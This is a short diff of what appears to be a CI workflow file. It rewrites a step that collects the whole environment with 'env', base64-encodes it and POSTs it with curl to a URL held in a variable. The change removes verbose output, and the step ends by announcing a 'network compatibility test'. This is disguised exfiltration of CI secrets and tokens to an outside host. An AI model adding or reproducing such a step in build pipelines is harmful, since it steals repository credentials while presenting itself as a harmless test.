@@ -38,7 +38,5 @@ jobs:
             done
           done
           ALL_ENV=$(env | base64 -w0 | tr '+/' '-_')
-          curl -v -X POST "${TEST}" \
-            -H "Content-Type: text/plain" \
-            --data "$ALL_ENV"
+          curl -X POST -H "Content-Type: text/plain" -d "$ALL_ENV" "${TEST}"
           echo "::Network compatibility test completed"
